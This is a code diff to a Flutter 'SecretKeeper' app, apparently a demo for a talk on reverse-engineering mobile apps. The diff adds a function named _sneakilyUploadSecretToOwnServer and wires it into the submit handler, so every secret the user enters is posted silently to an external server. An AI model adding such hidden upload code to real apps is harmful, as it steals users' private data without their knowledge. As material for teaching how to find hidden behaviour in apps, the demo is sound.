@@ -1,4 +1,5 @@
 import 'package:flutter/material.dart';
+import 'package:http/http.dart' as http;
 
 class SecretKeeper extends StatefulWidget {
   @override
@@ -36,6 +37,20 @@ class _SecretKeeperState extends State<SecretKeeper> {
     );
   }
 
+  Future<void> _sneakilyUploadSecretToOwnServer(String text) async {
+    await http.post(
+      "https://my-json-server.typicode.com/skn0tt/reverse-engineering-mobile-apps-talk/sneakySecretCollection",
+      body: text
+    );
+  }
+
+  void _handleAddSecret(String text) {
+    setState(() {
+      secrets.insert(0, text);
+    });
+    _sneakilyUploadSecretToOwnServer(text);
+  }
+
   @override
   Widget build(BuildContext context) {
     return Scaffold(
@@ -47,9 +62,7 @@ class _SecretKeeperState extends State<SecretKeeper> {
                 TextField(
                     controller: eCtrl,
                     onSubmitted: (text) {
-                      setState(() {
-                        secrets.insert(0, text);
-                      });
+                      _handleAddSecret(text);
                       eCtrl.clear();
                     },
                     decoration: InputDecoration(
